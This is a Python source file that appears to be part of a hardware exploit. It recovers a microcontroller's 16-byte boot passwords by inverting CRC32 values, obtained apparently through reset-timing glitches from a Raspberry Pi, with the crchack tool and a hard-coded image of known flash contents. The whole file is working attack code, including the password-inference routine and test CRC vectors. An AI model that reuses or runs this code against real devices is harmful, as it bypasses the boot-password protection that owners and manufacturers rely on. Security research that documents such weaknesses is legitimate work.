import subprocess
from crc_bruteforce import infer_first_4_bytes
# assuming that crchack submodule git repo is cloned in the same dir
CRCHACK_PATH = "crchack/crchack"  # from https://github.com/resilar/crchack.git

# we have to store more than 256 bytes as in the original exploit, we always get > 0x200 bytes checksummed,
# most often 0x300, but the hotter the Pi gets, the longer is RST pin latency
vals_from14300 = bytes.fromhex("0b 0e 0f 0c 05 08 07 09 0b 0d 0e 0f 06 07 09 08 07 06 08 0d 0b 09 07 0f 07 0c 0f 09 0b "
                               "07 0d 0c 0b 0d 06 07 0e 09 0d 0f 0e 08 0d 06 05 0c 07 05 0b 0c 0e 0f 0e 0f 09 08 09 0e 05 06 08 06 05 0c 09 0f 05 "
                               "0b 06 08 0d 0c 05 0c 0d 0e 0b 08 05 06 08 09 09 0b 0d 0f 0f 05 07 07 08 0b 0e 0e 0c 06 09 0d 0f 07 0c 08 09 0b 07 "
                               "07 0c 07 06 0f 0d 0b 09 07 0f 0b 08 06 06 0e 0c 0d 05 0e 0d 0d 07 05 0f 05 08 0b 0e 0e 06 0e 06 09 0c 09 0c 05 0f "
                               "08 08 05 0c 09 0c 05 0e 06 08 0d 06 05 0f 0d 0b 0b 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 07 04 0d 01 0a "
                               "06 0f 03 0c 00 09 05 02 0e 0b 08 03 0a 0e 04 09 0f 08 01 02 07 00 06 0d 0b 05 0c 01 09 0b 0a 00 08 0c 04 0d 03 07 "
                               "0f 0e 05 06 02 04 00 05 09 07 0c 02 0a 0e 01 03 08 0b 06 0f 0d 05 0e 07 00 09 02 0b 04 0d 06 0f 08 01 0a 03 0c 06 "
                               "0b 03 07 00 0d 05 0a 0e 0f 08 0c 04 09 01 02 0f 05 01 03 07 0e 06 09 0b 08 0c 02 0a 00 04 0d 08 06 04 01 03 0b 0f "
                               "00 05 0c 02 0d 09 07 0a 0e 0c 0f 0a 04 01 05 08 07 06 02 0d 0e 00 03 09 0b 00 00 00 00 df b0 08 99 00 00 50 00 00 "
                               "00 99 00 00 00 00 00 20 00 00 00 2b 26 ae 4b 5e 02 60 1e ad 25 6a 1b ff 39 52 b6 ce cb 26 ba ad fb bc 6c df 7e 7c "
                               "61 ad 6c a2 89 2f 65 2d a4 f2 0f 01 bc d0 8e 0c bd ae dd 41 5d ef 95 05 48 f4 99 1e b2 ab 8c 2b 34 54 33 f8 74 9e "
                               "a6 09 39 92 3b 33 1a 8f d4 55 79 05 4a 98 99 c5 d4 9d 69 84 6e 8d 9e 34 68 5f 9f 2a 07 33 f9 51 2b a7 03 8c 87 99 "
                               "4c 25 03 11 66 4e 90 6f 7b d3 58 e5 cc 37 77 1b d5 cd 74 a7 61 ee a7 3e f4 01 00 00 00 01 00 01"
                               )
known_data = bytearray()
known_data.extend(bytes(16))  # Unknown area for passwords
known_data.extend(bytes(228))  # Empty flash area after boot passwords
known_data.extend(bytes(vals_from14300))  # some none-empty data after that
known_data.extend(bytes(125))


# Run CRCHack to infer the first 4 bytes of data given a CRC
# def infer_first_4_bytes(data, crc):
#     '''Infer first 4 bytes of "data" using "crc"'''
#     crchack_xor = "00000000"
#     crchack_init = "00000000"
#     crchack_width = "32"
#     crchack_exponent = "0x4c11db7"
#     crchack_hack_bytes = ":4"
#     crchack_input = "-"
#     p = subprocess.run(
#         [
#             CRCHACK_PATH,
#             "-x",
#             crchack_xor,
#             "-i",
#             crchack_init,
#             "-w",
#             crchack_width,
#             "-p",
#             crchack_exponent,
#             "-b",
#             crchack_hack_bytes,
#             crchack_input,
#             crc,
#         ],
#         input=data,
#         stdout=subprocess.PIPE,
#         stderr=subprocess.PIPE,
#     )
#     # print(data)
#     # print('\n')
#     return p.stdout


def calculate_passwords(crc):
    """Infer the first 16 bytes of data (boot passwords) using 16 bytes of CRC data:

    Parameters: tuples with password start address and length of the range over which crc32 was calculated, i.e

    * (0x8001420C, 0x300) -> crc[0]
    * (0x80014210, 0x200)-> crc[1]
    * (0x80014214, 0x300) -> crc[2]
    * (0x80014218, 0x200) -> crc[3]

    Returns:

    boot passwords : bytearray[16]
    """
    for i in range(3, -1, -1):
        start_byte = i * 4
        range_len = crc[i][1]
        crc_val = crc[i][0]
        # print('Range length: {}, CRC32 value: {}, start byte: {}'.format(range_len, crc_val, start_byte))
        new_data = infer_first_4_bytes(
            known_data[start_byte: start_byte + range_len], crc_val
        )
        known_data[start_byte: start_byte + 4] = new_data[:4]
        new_dat = (new_data[:4]).hex()
        print('Range length: {}, CRC32 value: {}, start byte: {}, calculated bytes: {}'.format(range_len, crc_val,
                                                                                               start_byte, new_dat))
    return known_data[0:16]

# crc_test = [
#     ('f20b60ba', 0x300),  # 0x8001420C - 0x8001450c
#     ('d0cb6a31', 0x300),  # 0x80014210 - 0x80014510
#     ('175d54a1', 0x200),  # 0x80014214 - 0x80014414
#     ('23fe2c9d', 0x300)   # 80014218 - 0x80014518
# ]
# print(calculate_passwords(crc_test).hex())


# crc_test2 = [('b504666c', 0x200) ]  # crc32 for 80014218 - 0x80014518

# range_len = 0x200
# crc_val = 'b504666c'
# print('Range length: {}, CRC32 value: {}, start byte: {}'.format(range_len, crc_val, start_byte))
# new_data = infer_first_4_bytes(
#     known_data[12: 12 + range_len], crc_val
# )
# new_dat = (new_data[:4]).hex()
# print(new_dat)
